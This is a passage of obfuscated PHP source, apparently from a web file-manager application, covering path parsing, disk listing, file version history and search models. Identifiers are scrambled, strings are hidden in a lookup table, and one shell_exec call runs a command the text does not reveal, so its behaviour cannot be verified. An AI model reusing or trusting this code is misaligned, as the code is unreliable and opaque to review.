Model($Ô½øßÃ[1166])->set($Ô½øßÃ[1167], $…ª±Øı¶); } return $…ª±Øı¶; } $…ª±Øı¶ = DATA_PATH . $Ô½øßÃ[1168] . rand_string(8) . $Ô½øßÃ[8]; $…ª±Øı¶ = IO::mkdir($…ª±Øı¶); $…ª±Øı¶ = rtrim($…ª±Øı¶, $Ô½øßÃ[8]) . $Ô½øßÃ[8]; file_put_contents($…ª±Øı¶ . $Ô½øßÃ[1169], $Ô½øßÃ[33]); file_put_contents(DATA_PATH . $Ô½øßÃ[1169], $Ô½øßÃ[33]); Model($Ô½øßÃ[1166])->set($Ô½øßÃ[1167], $…ª±Øı¶); return $…ª±Øı¶; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\162\122\145\143\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\106\151\x6c\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\151\154\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\x75\x70\122\x6f\157\164\123\145\154\146\175"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\150\141\162\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\x65\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\x65\111\164\x65\x6d\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\x73\x65\x61\x72\x63\150\175"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\x65\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\162\175"; public static function typeList() { $À÷Ÿû =& $_SERVER[Á÷ ­Šë]; return array($À÷Ÿû[1170] => self::KOD_SOURCE, $À÷Ÿû[1171] => self::KOD_USER_RECYCLE, $À÷Ÿû[1172] => self::KOD_USER_FAV, $À÷Ÿû[1173] => self::KOD_USER_FILE_TAG, $À÷Ÿû[1174] => self::KOD_USER_FILE_TYPE, $À÷Ÿû[1175] => self::KOD_GROUP_ROOT_SELF, $À÷Ÿû[1176] => self::KOD_USER_SHARE, $À÷Ÿû[1177] => self::KOD_USER_SHARE_LINK, $À÷Ÿû[1178] => self::KOD_USER_SHARE_TO_ME, $À÷Ÿû[1179] => self::KOD_SHARE_ITEM, $À÷Ÿû[1180] => self::KOD_SHARE_LINK, $À÷Ÿû[1181] => self::KOD_SEARCH, $À÷Ÿû[1182] => self::KOD_BLOCK, $À÷Ÿû[1183] => self::KOD_IO, $À÷Ÿû[1184] => self::KOD_USER_RECENT, $À÷Ÿû[1185] => self::KOD_USER_DRIVER); } public static function parse($”¥¸ØÆ) { $­Í…™ü… =& $_SERVER[Á÷ ­Šë]; $”¥¸ØÆ = self::clear($”¥¸ØÆ); $ûĞû²‹¦ = array_values(self::typeList()); preg_match($­Í…™ü…[1186], $”¥¸ØÆ, $Şˆ‚ööÅ); $Õ†›êç = array($­Í…™ü…[427] => !1, $­Í…™ü…[1187] => !1, $­Í…™ü…[424] => !1, $­Í…™ü…[86] => $”¥¸ØÆ, $­Í…™ü…[1096] => !1, $­Í…™ü…[1095] => $­Í…™ü…[33]); if (is_array($Şˆ‚ööÅ) && count($Şˆ‚ööÅ) == 5) { $Öİ£‰ = $­Í…™ü…[1188] . $Şˆ‚ööÅ[2] . $­Í…™ü…[334]; if (in_array($Öİ£‰, $ûĞû²‹¦)) { $Õ†›êç[$­Í…™ü…[1096]] = $Şˆ‚ööÅ[1]; $Õ†›êç[$­Í…™ü…[29]] = $Öİ£‰; $Õ†›êç[$­Í…™ü…[1189]] = substr($Öİ£‰, 1, -1); $Õ†›êç[$­Í…™ü…[404]] = $Şˆ‚ööÅ[3]; } $Õ†›êç[$­Í…™ü…[1095]] = $Şˆ‚ööÅ[4]; } $ô•Å‹¥Ø = array($­Í…™ü…[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Õ†›êç[$­Í…™ü…[1151]] = in_array($Õ†›êç[$­Í…™ü…[29]], $ô•Å‹¥Ø); return $Õ†›êç; } public static function isTruePath($¦êÕ„«) { $ªÄÑ“»ç =& $_SERVER[Á÷ ­Šë]; if (substr($¦êÕ„«, 0, 1) != $ªÄÑ“»ç[1188]) { return !0; } if (strpos($¦êÕ„«, $ªÄÑ“»ç[413]) === 0) { return !0; } if (strpos($¦êÕ„«, $ªÄÑ“»ç[1155]) === 0) { return !0; } if (strpos($¦êÕ„«, $ªÄÑ“»ç[1190]) === 0) { return !0; } if (strpos($¦êÕ„«, $ªÄÑ“»ç[1191]) === 0) { return !0; } if (strpos($¦êÕ„«, $ªÄÑ“»ç[1192]) === 0) { return !0; } return !1; } public static function clear($ÙÒàÈ×Ø) { $‘Ó­ã¤‚ =& $_SERVER[Á÷ ­Šë]; $ÙÒàÈ×Ø = str_replace(array($‘Ó­ã¤‚[1069], $‘Ó­ã¤‚[62]), $‘Ó­ã¤‚[50], $ÙÒàÈ×Ø); $ÙÒàÈ×Ø = str_replace($‘Ó­ã¤‚[107], $‘Ó­ã¤‚[8], $ÙÒàÈ×Ø); $§«ğêòı = $‘Ó­ã¤‚[1193]; if (substr($ÙÒàÈ×Ø, 0, 3) == $‘Ó­ã¤‚[1194]) { $ÙÒàÈ×Ø = substr($ÙÒàÈ×Ø, 3); } while (strstr($ÙÒàÈ×Ø, $§«ğêòı)) { $ÙÒàÈ×Ø = str_replace($§«ğêòı, $‘Ó­ã¤‚[8], $ÙÒàÈ×Ø); } $ÙÒàÈ×Ø = preg_replace($‘Ó­ã¤‚[1195], $‘Ó­ã¤‚[8], $ÙÒàÈ×Ø); if ($ÙÒàÈ×Ø == $‘Ó­ã¤‚[8]) { return $‘Ó­ã¤‚[8]; } $ÙÒàÈ×Ø = rtrim($ÙÒàÈ×Ø, $‘Ó­ã¤‚[8]); return $ÙÒàÈ×Ø; } public static function sourceID($·êÇ»…½) { $¶şÄâÆØ =& $_SERVER[Á÷ ­Šë]; $ú¿Úõ¯ê = self::parse($·êÇ»…½); if ($ú¿Úõ¯ê[$¶şÄâÆØ[29]] !== self::KOD_SOURCE) { show_json(LNG($¶şÄâÆØ[1196]), !1); } return $ú¿Úõ¯ê[$¶şÄâÆØ[404]]; } public static function make($¹ôñª†) { if (!$¹ôñª†) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¹ôñª†)); } public static function makeShare($«¹·ïá¯, $‘û“ÔŸÕ) { return self::makePath(self::KOD_SHARE_ITEM, $«¹·ïá¯, $‘û“ÔŸÕ); } public static function makeFileTypePath($‘Ò¨ìç«) { return self::makePath(self::KOD_USER_FILE_TYPE, $‘Ò¨ìç«); } public static function makeFileTagPath($­Ÿ´ ª) { return self::makePath(self::KOD_USER_FILE_TAG, $­Ÿ´ ª); } public static function makePath($ÈƒßõÜó, $°”‚³¸õ = '', $¶úï¼®È = '') { $¼©ÎİÆ¸ =& $_SERVER[Á÷ ­Šë]; $µÃçôø¿ = substr($ÈƒßõÜó, 1, -1); $‡Áû‰ë = $¼©ÎİÆ¸[1197] . $µÃçôø¿ . $¼©ÎİÆ¸[1198] . $°”‚³¸õ . $¼©ÎİÆ¸[1199]; $‡Áû‰ë = $¶úï¼®È ? $‡Áû‰ë . $¶úï¼®È . $¼©ÎİÆ¸[8] : $‡Áû‰ë; return $‡Áû‰ë; } public static function hashPath($£ãé®ÕÑ, $Ë‰é®´Ğ = true) { $ ¤ı½ =& $_SERVER[Á÷ ­Šë]; $áë«ÖÒ¥ = is_array($£ãé®ÕÑ) ? $£ãé®ÕÑ : IO::info($£ãé®ÕÑ); $Ãš©óºÏ = _get($áë«ÖÒ¥, $ ¤ı½[1200], $ ¤ı½[33]); if (!$Ãš©óºÏ && isset($áë«ÖÒ¥[$ ¤ı½[407]])) { $áë«ÖÒ¥ = IO::info(KodIO::make($áë«ÖÒ¥[$ ¤ı½[407]])); $Ãš©óºÏ = _get($áë«ÖÒ¥, $ ¤ı½[1200], $ ¤ı½[33]); } if (!$Ãš©óºÏ && $Ë‰é®´Ğ) { $§¶µµê¼ = KodIO::parse($áë«ÖÒ¥[$ ¤ı½[86]]); if (!$§¶µµê¼[$ ¤ı½[29]]) { $Ãš©óºÏ = IO::hashSimple($áë«ÖÒ¥[$ ¤ı½[86]]); } } if (!$Ãš©óºÏ) { $Ãš©óºÏ = md5($áë«ÖÒ¥[$ ¤ı½[86]] . $áë«ÖÒ¥[$ ¤ı½[88]] . $áë«ÖÒ¥[$ ¤ı½[94]]); } return $Ãš©óºÏ; } public static function initSystemPath() { $¯ÓÁİÄ… =& $_SERVER[Á÷ ­Šë]; if (defined($¯ÓÁİÄ…[1201])) { return; } define($¯ÓÁİÄ…[1201], self::systemPath($¯ÓÁİÄ…[1202])); define($¯ÓÁİÄ…[1203], self::systemPath($¯ÓÁİÄ…[1204])); define($¯ÓÁİÄ…[1205], self::systemPath($¯ÓÁİÄ…[1206])); define($¯ÓÁİÄ…[1207], self::systemPath($¯ÓÁİÄ…[1208])); IOHistory::bindEvent(); } public static function systemPath($ÊîìµÕö) { $×Æ”¢ĞÌ =& $_SERVER[Á÷ ­Šë]; $Ú”ç© ï = $×Æ”¢ĞÌ[1209] . ucfirst($ÊîìµÕö); $íÇ¯Áš„ = Model($×Æ”¢ĞÌ[765])->get($Ú”ç© ï); if ($íÇ¯Áš„) { return $íÇ¯Áš„; } if ($ÊîìµÕö == $×Æ”¢ĞÌ[1202]) { $íÇ¯Áš„ = self::make(Model($×Æ”¢ĞÌ[827])->systemRootPathAdd($×Æ”¢ĞÌ[541])); } else { $íÇ¯Áš„ = self::systemPath($×Æ”¢ĞÌ[1202]); $ÁèàØ = self::sourceID($íÇ¯Áš„); $íÇ¯Áš„ = self::make(Model($×Æ”¢ĞÌ[827])->mkdir($ÁèàØ, $ÊîìµÕö)); } Model($×Æ”¢ĞÌ[765])->set($Ú”ç© ï, $íÇ¯Áš„); return $íÇ¯Áš„; } public static function systemFolder($»’†öû) { $ıäÌ– = IO_PATH_SYSTEM_SOURCE . $»’†öû; $´Á«††ã = Cache::get($ıäÌ–); if (!$´Á«††ã) { $İ—ëé­û = IO::infoFull($ıäÌ–); if (!$İ—ëé­û) { $´Á«††ã = IO::mkdir($ıäÌ–, REPEAT_SKIP); } else { $´Á«††ã = $İ—ëé­û[$_SERVER[Á÷ ­Šë][86]]; } Cache::set($ıäÌ–, $´Á«††ã, 3600 * 10); } return $´Á«††ã; } public static function defaultDriver() { return Model($_SERVER[Á÷ ­Šë][762])->defaultDriver(); } public static function defaultIO() { $îÓë„Ì =& $_SERVER[Á÷ ­Šë]; $½í»é®¡ = self::defaultDriver(); return $îÓë„Ì[1210] . $½í»é®¡[$îÓë„Ì[404]] . $îÓë„Ì[1199]; } public static function defaultDriverInit() { static $ù€©â  = false; if ($ù€©â ) { return $ù€©â ; } $ù€©â  = IO::init(self::defaultIO()); return $ù€©â ; } public static function fileTypeList() { $Œ–ë´¸ =& $_SERVER[Á÷ ­Šë]; $Ô¬Ø‹Ôğ = $GLOBALS[$Œ–ë´¸[6]][$Œ–ë´¸[1211]]; foreach ($Ô¬Ø‹Ôğ as $»°­±–Í => $ÚŸ¥½ö) { $¿¾÷¨ÎÕ = $Œ–ë´¸[1212] . $»°­±–Í; $•†áûáŒ = LNG($¿¾÷¨ÎÕ); if ($¿¾÷¨ÎÕ != $•†áûáŒ) { $Ô¬Ø‹Ôğ[$»°­±–Í][$Œ–ë´¸[28]] = $•†áûáŒ; } } return $Ô¬Ø‹Ôğ; } public static function diskList($ôï º¼ = true) { $çÌì‡Æ„ = $_SERVER[Á÷ ­Šë][1213]; if ($ôï º¼) { $ä§ºÃ‘å = Cache::get($çÌì‡Æ„); if (is_array($ä§ºÃ‘å)) { return $ä§ºÃ‘å; } } $ä§ºÃ‘å = self::diskListGet(); Cache::set($çÌì‡Æ„, $ä§ºÃ‘å, 3600); return $ä§ºÃ‘å; } public static function diskListGet() { $‹åœ³ó† =& $_SERVER[Á÷ ­Šë]; $·€’œ’ = array(); if ($GLOBALS[$‹åœ³ó†[6]][$‹åœ³ó†[1214]] == $‹åœ³ó†[1215]) { $¾Ò·ô«‹ = $‹åœ³ó†[1216]; for ($ì´ŠüóÖ = 0; $ì´ŠüóÖ < strlen($¾Ò·ô«‹); $ì´ŠüóÖ++) { $®ë¯‘ = $¾Ò·ô«‹[$ì´ŠüóÖ] . $‹åœ³ó†[1217]; if (file_exists($®ë¯‘)) { $·€’œ’[] = $®ë¯‘; } } return $·€’œ’; } if (!function_exists($‹åœ³ó†[108])) { $·€’œ’[] = $‹åœ³ó†[837]; return $·€’œ’; } $ÇóõÙ = explode($‹åœ³ó†[62], shell_exec($‹åœ³ó†[1218])); array_shift($ÇóõÙ); array_pop($ÇóõÙ); $„“ëœæç = array($‹åœ³ó†[1219], $‹åœ³ó†[1220], $‹åœ³ó†[1221], $‹åœ³ó†[1222]); foreach ($ÇóõÙ as $ÎÄœ¯ı’) { $è²‰êÀÔ = preg_split($‹åœ³ó†[1223], $ÎÄœ¯ı’); $®ë¯‘ = $è²‰êÀÔ[count($è²‰êÀÔ) - 1]; if (!strstr($è²‰êÀÔ[0], $‹åœ³ó†[1224])) { continue; } if (!$®ë¯‘ || in_array($®ë¯‘, $„“ëœæç)) { continue; } $·€’œ’[] = rtrim($®ë¯‘, $‹åœ³ó†[8]) . $‹åœ³ó†[8]; } return $·€’œ’; } public static function isSameDisk($Ğ•Áû‹, $ğØ¿ï§É) { $÷ÏŞØ­¤ =& $_SERVER[Á÷ ­Šë]; if ($GLOBALS[$÷ÏŞØ­¤[6]][$÷ÏŞØ­¤[1214]] == $÷ÏŞØ­¤[1215]) { return strtolower(substr($Ğ•Áû‹, 0, 1)) == strtolower(substr($ğØ¿ï§É, 0, 1)); } $²ÃåúÅ = self::diskList(); $¡è‡±¼ = !1; $âÅ½Ï–± = !1; sort($²ÃåúÅ); $²ÃåúÅ = array_reverse($²ÃåúÅ); $Ğ•Áû‹ = rtrim($Ğ•Áû‹, $÷ÏŞØ­¤[8]) . $÷ÏŞØ­¤[8]; $ğØ¿ï§É = rtrim($ğØ¿ï§É, $÷ÏŞØ­¤[8]) . $÷ÏŞØ­¤[8]; foreach ($²ÃåúÅ as $Ú”€ª´ƒ) { $öÎÑèâœ = strlen($Ú”€ª´ƒ); if (!$¡è‡±¼ && substr($Ğ•Áû‹, 0, $öÎÑèâœ) == $Ú”€ª´ƒ) { $¡è‡±¼ = $Ú”€ª´ƒ; } if (!$âÅ½Ï–± && substr($ğØ¿ï§É, 0, $öÎÑèâœ) == $Ú”€ª´ƒ) { $âÅ½Ï–± = $Ú”€ª´ƒ; } if ($¡è‡±¼ && $âÅ½Ï–±) { break; } } return $¡è‡±¼ === $âÅ½Ï–±; } public static function transferType($€¬ìØ, $äõÎŞ) { $Ë ›¥æë =& $_SERVER[Á÷ ­Šë]; $¥‘Íé‚Õ = self::driverType($€¬ìØ); $‚™µûğ = self::driverType($äõÎŞ); if ($¥‘Íé‚Õ[$Ë ›¥æë[29]] == $‚™µûğ[$Ë ›¥æë[29]] && $¥‘Íé‚Õ[$Ë ›¥æë[1225]] == $‚™µûğ[$Ë ›¥æë[1225]]) { return $Ë ›¥æë[1226]; } if ($¥‘Íé‚Õ[$Ë ›¥æë[29]] == $Ë ›¥æë[866] && $‚™µûğ[$Ë ›¥æë[29]] == $Ë ›¥æë[116]) { return $Ë ›¥æë[1125]; } if ($¥‘Íé‚Õ[$Ë ›¥æë[29]] == $Ë ›¥æë[116] && $‚™µûğ[$Ë ›¥æë[29]] == $Ë ›¥æë[866]) { return $Ë ›¥æë[117]; } return $Ë ›¥æë[1227]; } public static function driverType($õÏßÒØü) { $²òê½ÎÜ =& $_SERVER[Á÷ ­Šë]; $‡û¸ıĞ¹ = str_replace($²òê½ÎÜ[1228], $²òê½ÎÜ[33], strtolower($õÏßÒØü->getType())); if ($‡û¸ıĞ¹ == $²òê½ÎÜ[753] || $‡û¸ıĞ¹ == $²òê½ÎÜ[1229] || $‡û¸ıĞ¹ == $²òê½ÎÜ[1230]) { $õÏßÒØü = self::defaultDriverInit(); } else { if ($‡û¸ıĞ¹ == $²òê½ÎÜ[1132] || $‡û¸ıĞ¹ == $²òê½ÎÜ[1231]) { $õÏßÒØü = IO::init($õÏßÒØü->pathParse[$²òê½ÎÜ[1079]]); } } $–ûµøŠ§ = $õÏßÒØü->path; $‡û¸ıĞ¹ = str_replace($²òê½ÎÜ[1228], $²òê½ÎÜ[33], strtolower($õÏßÒØü->getType())); if ($‡û¸ıĞ¹ == $²òê½ÎÜ[116]) { return array($²òê½ÎÜ[29] => $²òê½ÎÜ[116], $²òê½ÎÜ[1225] => $²òê½ÎÜ[33], $²òê½ÎÜ[86] => $–ûµøŠ§); } return array($²òê½ÎÜ[29] => $²òê½ÎÜ[866], $²òê½ÎÜ[1225] => $õÏßÒØü->pathDriver, $²òê½ÎÜ[86] => $–ûµøŠ§); } public static function pathDriverType($«Œ‹ì£ú) { return $«Œ‹ì£ú ? self::driverType(IO::init($«Œ‹ì£ú)) : !1; } } goto Bó©Øˆ‰Ø¦; Eğ¤“á‰Ğ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\143\x65\137\x68\151\x73\164\157\162\171"; public function historyCount($¸™ÔåÃî) { $ÇæÖíË» =& $_SERVER[Á÷ ­Šë]; if (!$¸™ÔåÃî) { return array(); } if (is_string($¸™ÔåÃî) || is_int($¸™ÔåÃî)) { $¸™ÔåÃî = array($¸™ÔåÃî); } $ŸĞ„¾«¶ = array($ÇæÖíË»[407], $ÇæÖíË»[1774] => $ÇæÖíË»[504]); $ó¿™Ä»“ = array($ÇæÖíË»[407] => array($ÇæÖíË»[7], $¸™ÔåÃî)); $Ş¹„Æññ = $this->field($ŸĞ„¾«¶)->where($ó¿™Ä»“)->group($ÇæÖíË»[407])->select(); return array_to_keyvalue($Ş¹„Æññ, $ÇæÖíË»[407], $ÇæÖíË»[504]); } public function addHistory($—÷Œã‘Š, $¸ù™ = '') { $êÇ½§ =& $_SERVER[Á÷ ­Šë]; $ÊıÀ£ÂÜ = array($êÇ½§[422] => $—÷Œã‘Š[$êÇ½§[407]], $êÇ½§[1565] => isset($—÷Œã‘Š[$êÇ½§[458]]) ? $—÷Œã‘Š[$êÇ½§[458]] : $—÷Œã‘Š[$êÇ½§[456]], $êÇ½§[472] => $—÷Œã‘Š[$êÇ½§[471]], $êÇ½§[583] => $—÷Œã‘Š[$êÇ½§[88]], $êÇ½§[1976] => $¸ù™); $‰®óº¦ = $GLOBALS[$êÇ½§[6]][$êÇ½§[98]][$êÇ½§[1135]]; if ($‰®óº¦ > 1) { $this->historyAutoClear($ÊıÀ£ÂÜ[$êÇ½§[407]]); $this->add($ÊıÀ£ÂÜ); } Hook::trigger($êÇ½§[1977], $ÊıÀ£ÂÜ); Model($êÇ½§[1978])->eventFileEdit($—÷Œã‘Š[$êÇ½§[407]]); } private function historyAutoClear($ë¶° ) { $Š½Áäƒû =& $_SERVER[Á÷ ­Šë]; $øÊÏÇç = Model($Š½Áäƒû[765])->get($Š½Áäƒû[1157]); $Ï´Ëœµı = $GLOBALS[$Š½Áäƒû[6]][$Š½Áäƒû[98]][$Š½Áäƒû[1135]]; $†±¾¸¿³ = $øÊÏÇç == $Š½Áäƒû[1158] ? 5 : $Ï´Ëœµı; if ($Ï´Ëœµı <= 1) { $†±¾¸¿³ = 1; } if ($†±¾¸¿³ >= 500) { return; } $á™í§÷„ = array($Š½Áäƒû[422] => $ë¶° ); $ã×›î = $this->field($Š½Áäƒû[1979])->where($á™í§÷„)->order($Š½Áäƒû[1973])->select(); if (!$ã×›î || $†±¾¸¿³ >= count($ã×›î)) { return; } $İç… Ìé = array_to_keyvalue($ã×›î, $Š½Áäƒû[33], $Š½Áäƒû[404]); $İç… Ìé = array_slice($İç… Ìé, $†±¾¸¿³); $ò‰ç£Ïæ = array_to_keyvalue($ã×›î, $Š½Áäƒû[33], $Š½Áäƒû[471]); $ò‰ç£Ïæ = array_slice($ò‰ç£Ïæ, $†±¾¸¿³); if (!$İç… Ìé || !$ò‰ç£Ïæ) { return; } $á™í§÷„ = array($Š½Áäƒû[424] => array($Š½Áäƒû[7], $İç… Ìé)); $this->where($á™í§÷„)->delete(); Model($Š½Áäƒû[474])->remove($ò‰ç£Ïæ); } public function listData($ûœÊÄ¿) { $¾ı›‘Ò =& $_SERVER[Á÷ ­Šë]; $„·‡Ÿş« = array($¾ı›‘Ò[422] => $ûœÊÄ¿); $³ïòŸá› = $¾ı›‘Ò[1980]; $Î‰şíÒ = $this->field($³ïòŸá›)->where($„·‡Ÿş«)->order($¾ı›‘Ò[1973])->selectPage(); $this->_listAppendUser($Î‰şíÒ[$¾ı›‘Ò[376]]); $ç«œ¯Ò = Model($¾ı›‘Ò[765])->get($¾ı›‘Ò[1157]); $ÜÂÑÓ = 5; if ($ç«œ¯Ò == $¾ı›‘Ò[1158]) { $Î‰şíÒ[$¾ı›‘Ò[376]] = array_slice($Î‰şíÒ[$¾ı›‘Ò[376]], 0, $ÜÂÑÓ); $Î‰şíÒ[$¾ı›‘Ò[373]] = array($¾ı›‘Ò[1981] => 1, $¾ı›‘Ò[1982] => 20, $¾ı›‘Ò[1983] => 1, $¾ı›‘Ò[1984] => count($Î‰şíÒ[$¾ı›‘Ò[376]])); } return $Î‰şíÒ; } protected function _listAppendUser(&$ºøßóÍÂ) { $š©Ó³Ã =& $_SERVER[Á÷ ­Šë]; $€ğ¡üÍ½ = array_to_keyvalue($ºøßóÍÂ, $š©Ó³Ã[33], $š©Ó³Ã[1574]); $Îû¤ÚÒš = Model($š©Ó³Ã[542])->userListInfo($€ğ¡üÍ½); foreach ($ºøßóÍÂ as &$€«êˆ’ö) { $·ôçÏ  = $€«êˆ’ö[$š©Ó³Ã[1574]]; $€«êˆ’ö[$š©Ó³Ã[456]] = $Îû¤ÚÒš[$·ôçÏ ] ? $Îû¤ÚÒš[$·ôçÏ ] : !1; } unset($€«êˆ’ö); } public function fileInfo($¦˜³ğ¿Ò) { $ùÑÉå÷¸ =& $_SERVER[Á÷ ­Šë]; $ÓĞÉëŞá = $this->tablePrefix; $ğ“Ößé = "{$ÓĞÉëŞá}\151\x6f\137\146\151\154\145\x20\146\151\154\145\163\x20\157\156\x20\x66\x69\154\x65\163\x2e\x66\x69\x6c\x65\x49\104\40\75\x20\x68\151\x73\x74\x6f\162\171\x2e\x66\x69\154\145\111\104"; return $this->alias($ùÑÉå÷¸[1985])->where(array($ùÑÉå÷¸[424] => $¦˜³ğ¿Ò))->join($ğ“Ößé, $ùÑÉå÷¸[1986])->find(); } public function removeItem($›¤ÀÍñ™) { $Àíû²÷Ä =& $_SERVER[Á÷ ­Šë]; $ƒØÕ¢Óƒ = array($Àíû²÷Ä[424] => $›¤ÀÍñ™); $ûÇç€¶é = $this->where($ƒØÕ¢Óƒ)->find(); if ($ûÇç€¶é) { $»¨Ş¡Œ× = $this->where($ƒØÕ¢Óƒ)->delete(); Model($Àíû²÷Ä[474])->remove($ûÇç€¶é[$Àíû²÷Ä[471]]); return $»¨Ş¡Œ×; } return !1; } public function removeBySource($’óìŸÌ) { $ö›Ëœ¶´ =& $_SERVER[Á÷ ­Šë]; if (!$’óìŸÌ) { return !1; } if (!is_array($’óìŸÌ)) { $’óìŸÌ = array($’óìŸÌ); } $¶Ñ¸£Ñö = array($ö›Ëœ¶´[422] => array($ö›Ëœ¶´[7], $’óìŸÌ)); $›ïÇŠãË = $this->field($ö›Ëœ¶´[472])->where($¶Ñ¸£Ñö)->select(); if ($›ïÇŠãË) { $this->where($¶Ñ¸£Ñö)->delete(); $©Ü°È…ø = array_to_keyvalue($›ïÇŠãË, $ö›Ëœ¶´[33], $ö›Ëœ¶´[471]); Model($ö›Ëœ¶´[474])->remove($©Ü°È…ø); } return !0; } public function setDetail($„ŒŒß†½, $ï©ú­½•) { $ ’‹çß× =& $_SERVER[Á÷ ­Šë]; return $this->where(array($ ’‹çß×[424] => $„ŒŒß†½))->save(array($ ’‹çß×[1976] => $ï©ú­½•)); } public function rollbackToItem($Œ™µ³«, $‘Í¨ÑôŒ) { $¹£’£¤î =& $_SERVER[Á÷ ­Šë]; $ú™ÑØ° = Model($¹£’£¤î[827])->sourceInfo($Œ™µ³«); $this->addHistory($ú™ÑØ°, LNG($¹£’£¤î[1987])); $âÙûÚ = $this->find($‘Í¨ÑôŒ); $ô™Ş§Æâ = array($¹£’£¤î[471] => $âÙûÚ[$¹£’£¤î[471]], $¹£’£¤î[88] => $âÙûÚ[$¹£’£¤î[88]], $¹£’£¤î[94] => time(), $¹£’£¤î[458] => USER_ID); Model($¹£’£¤î[827])->where(array($¹£’£¤î[407] => $Œ™µ³«))->save($ô™Ş§Æâ); return $this->where(array($¹£’£¤î[424] => $‘Í¨ÑôŒ))->delete(); } public function clearSame($¯ÄêËÓ„) { $ñÕ—àÒë =& $_SERVER[Á÷ ­Šë]; $£†ì¸ş = $this->listData($¯ÄêËÓ„); $²—³×Ì¨ = array_to_keyvalue_group($£†ì¸ş, $ñÕ—àÒë[471]); $€ “›¬ì = array(); $ä­ÈîÁ = array(); foreach ($²—³×Ì¨ as $¨ÈêÎû) { if (!$¨ÈêÎû || count($¨ÈêÎû) <= 1) { continue; } foreach ($¨ÈêÎû as $Õƒ¢¶üÇ) { $€ “›¬ì[] = $Õƒ¢¶üÇ[$ñÕ—àÒë[471]]; $ä­ÈîÁ[] = $Õƒ¢¶üÇ[$ñÕ—àÒë[404]]; } } if (!$ä­ÈîÁ) { return; } $this->where(array($ñÕ—àÒë[404] => array($ñÕ—àÒë[7], $ä­ÈîÁ)))->delete(); Model($ñÕ—àÒë[474])->remove($€ “›¬ì); } public function userSpace() { $ˆñÕÈŒµ =& $_SERVER[Á÷ ­Šë]; $ƒÅ»ğŞ = $this->tablePrefix; $¼òŒÖò = array($ˆñÕÈŒµ[1565] => USER_ID); $ËÓÔğÁÕ = "{$ƒÅ»ğŞ}\x69\157\137\146\151\x6c\145\x20\146\x69\154\x65\163\40\157\x6e\40\x66\x69\x6c\x65\163\x2e\146\151\154\145\x49\104\x20\75\x20\x68\x69\163\164\157\162\x79\x2e\146\x69\x6c\145\x49\104"; return $this->alias($ˆñÕÈŒµ[1985])->where($¼òŒÖò)->join($ËÓÔğÁÕ, $ˆñÕÈŒµ[1986])->sum($ˆñÕÈŒµ[88]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($­öœ›İö) { $ş¬ï•Ëà =& $_SERVER[Á÷ ­Šë]; $Ô©‡é‹€ = KodIO::fileTypeList(); $È£ºÅ±ˆ = $Ô©‡é‹€[$­öœ›İö]; if (!$È£ºÅ±ˆ) { return array(); } $–ÎŞà¼ = $È£ºÅ±ˆ[$ş¬ï•Ëà[178]]; $è´×˜Ö˜ = $ş¬ï•Ëà[7]; if (!$È£ºÅ±ˆ[$ş¬ï•Ëà[178]]) { $ÌÕÇ³¢ï = array_to_keyvalue($Ô©‡é‹€, $ş¬ï•Ëà[33], $ş¬ï•Ëà[178]); $–ÎŞà¼ = implode($ş¬ï•Ëà[47], $ÌÕÇ³¢ï); $è´×˜Ö˜ = $ş¬ï•Ëà[1988]; } $°·ûÎª½ = explode($ş¬ï•Ëà[47], trim($–ÎŞà¼, $ş¬ï•Ëà[47])); return array($è´×˜Ö˜, $°·ûÎª½); } public function listPathType($Ó¬ËºŠĞ) { $Íòûé =& $_SERVER[Á÷ ­Šë]; $¨¥¡€ôİ = $this->fileTypeWhere($Ó¬ËºŠĞ); if (!$¨¥¡€ôİ) { return array(); } $ƒÙ‡èüı = array($Íòûé[584] => SourceModel::TYPE_USER, $Íòûé[585] => USER_ID, $Íòûé[581] => 0, $Íòûé[582] => $¨¥¡€ôİ); return $this->listSource($ƒÙ‡èüı); } public function listSearch($Ç½Á»˜·, $×íò·†× = 300) { $Ó†¯í =& $_SERVER[Á÷ ­Šë]; if (isset($Ç½Á»˜·[$Ó†¯í[1833]]) && $Ç½Á»˜·[$Ó†¯í[1833]]) { $Ç½Á»˜·[$Ó†¯í[1833]] = str_replace($Ó†¯í[391], $Ó†¯í[1989], trim($Ç½Á»˜·[$Ó†¯í[1833]])); } $ç¿¬„Ï = $this->_parseSearchWhere($Ç½Á»˜·); $şâ³¼œ = $ç¿¬„Ï; if (!isset($ç¿¬„Ï[$Ó†¯í[435]])) { $ç¿¬„Ï[$Ó†¯í[435]] = 0; } $Èºˆé®Š = $Ó†¯í[1990]; $ï¬Äïçã = $Èºˆé®Š; $this->_listSearchBindPinyin($Ç½Á»˜·, $ç¿¬„Ï, $Èºˆé®Š); $this->alias($Ó†¯í[448])->_makeOrder(); $ç¿¬„Ï = $this->parseWhereLike($ç¿¬„Ï); $Ä‘–Î = $this->distinct(!0)->field($Èºˆé®Š)->where($ç¿¬„Ï)->selectPage($×íò·†×); $this->_listSearchFileContent($Ä‘–Î, $Ç½Á»˜·, $ï¬Äïçã, $şâ³¼œ); $this->_listSearchDesc($Ä‘–Î, $Ç½Á»˜·, $ï¬Äïçã); 